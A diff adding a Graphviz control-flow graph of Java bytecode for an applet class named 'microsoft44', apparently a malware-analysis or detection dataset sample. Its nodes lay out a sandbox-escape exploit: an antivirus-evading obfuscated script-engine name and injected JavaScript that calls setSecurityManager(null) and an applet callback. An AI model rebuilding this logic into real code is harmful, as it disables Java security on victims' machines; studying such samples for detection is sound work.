@@ -1,0 +1,105 @@
+digraph "" {
+    "r0 := @this: microsoft44"
+    "load.r r0"
+    "r0 := @this: microsoft44"->"load.r r0";
+    "new javax.swing.JList"
+    "load.r r0"->"new javax.swing.JList";
+    "dup1.r"
+    "new javax.swing.JList"->"dup1.r";
+    "push 1"
+    "dup1.r"->"push 1";
+    "newarray"
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "new javax.script.ScriptEngineManager"
+    "push 0"->"new javax.script.ScriptEngineManager";
+    "new javax.script.ScriptEngineManager"->"dup1.r";
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"
+    "dup1.r"->"specialinvoke <javax.script.ScriptEngineManager: void <init>()>";
+    "push \"jsavast\""
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"->"push \"jsavast\"";
+    "push \"avast\""
+    "push \"jsavast\""->"push \"avast\"";
+    "push \"\""
+    "push \"avast\""->"push \"\"";
+    "virtualinvoke <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>"
+    "push \"\""->"virtualinvoke <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"
+    "virtualinvoke <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>"->"virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"->"dup1.r";
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"
+    "dup1.r"->"interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0";
+    "store.r r1"
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"->"store.r r1";
+    "load.r r1"
+    "store.r r1"->"load.r r1";
+    "push \"applet\""
+    "load.r r1"->"push \"applet\"";
+    "push \"applet\""->"load.r r0";
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"
+    "load.r r0"->"interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2";
+    "pop"
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"->"pop";
+    "new java.lang.StringBuilder"
+    "pop"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"this.toString = function() {\tjava\""
+    "dup1.r"->"push \"this.toString = function() {\tjava\"";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
+    "push \"this.toString = function() {\tjava\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "push \".\""
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"push \".\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \".\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"lang\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"lang\"";
+    "push \"lang\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".\"";
+    "push \".\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"System\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"System\"";
+    "push \"System\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".\"";
+    "push \".\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"setSecurityManager(null);\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"setSecurityManager(null);\"";
+    "push \"setSecurityManager(null);\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\tapplet.callBack();\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\tapplet.callBack();\"";
+    "push \"\tapplet.callBack();\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));\"";
+    "push \"\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"};\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"};\"";
+    "push \"};\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"e = new Error();\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"e = new Error();\"";
+    "push \"e = new Error();\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"e.message = this;\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"e.message = this;\"";
+    "push \"e.message = this;\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"e\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"e\"";
+    "push \"e\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"load.r r1";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"
+    "load.r r1"->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2";
+    "arraywrite.r"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"->"arraywrite.r";
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"
+    "arraywrite.r"->"specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>";
+    "virtualinvoke <microsoft44: java.awt.Component add(java.awt.Component)>"
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"->"virtualinvoke <microsoft44: java.awt.Component add(java.awt.Component)>";
+    "virtualinvoke <microsoft44: java.awt.Component add(java.awt.Component)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <javax.script.ScriptException: void printStackTrace()>"
+    "virtualinvoke <microsoft44: java.awt.Component add(java.awt.Component)>"->"virtualinvoke <javax.script.ScriptException: void printStackTrace()>";
+}
